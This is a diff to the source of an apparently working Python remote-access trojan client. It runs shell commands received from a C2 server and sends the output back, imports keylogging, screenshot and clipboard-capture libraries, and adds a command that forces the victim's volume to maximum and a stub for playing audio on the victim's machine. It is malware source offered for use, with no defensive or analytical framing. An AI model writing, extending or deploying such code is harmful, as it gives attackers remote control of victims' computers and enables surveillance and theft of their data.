@@ -18,7 +18,7 @@ from time import time, sleep
 from subprocess import run, PIPE, STDOUT
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from pyperclip import paste, PyperclipWindowsException
-from pynput.keyboard import Listener, Controller
+from pynput.keyboard import Listener, Controller, Key
 from PIL import ImageGrab, Image
 from encryption import cipher
 
@@ -166,6 +166,10 @@ while True:
     elif not command.startswith("client "):
         # Run the command and get the output
         commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
+
+        # test print
+        print("[+] OS-System Command Command Executed and Result send to C2 Server.")
+
         # Send the output to the server, must be decoding it first because subprocess.run() return bytes
         post_to_server(commandOutput.decode())
 
@@ -444,7 +448,16 @@ while True:
                 # Configure a delay between 90 degree. shift
                 sleep(1.5)
 
+    # the "client max volume" command allows us to turn Client's machine volume on Max Volume
+    elif command == "client max volume" or command == "client max":
+        keyboard = Controller()
+        for i in range(50):
+            keyboard.press(Key.media_volume_up)
+            keyboard.release(Key.media_volume_up)
 
+    # the 'client play FILENAME.waw' command can be used to play voice recordings or waw music on the client
+    elif command.startswith("client play"):
+        pass
 
     # Else, the wrong input, actually not a Built-in Command or Shell Command or Client/Server Commands
     else:
@@ -453,7 +466,6 @@ while True:
 
 
 
-    # test print
-    print("[+] OS-System Command Command Executed and Result send to C2 Server.")
+
 
 print(Fore.LIGHTCYAN_EX + f"[+] Goodbye & Goodluck Ninja 🥷\n{client}" + Fore.RESET)
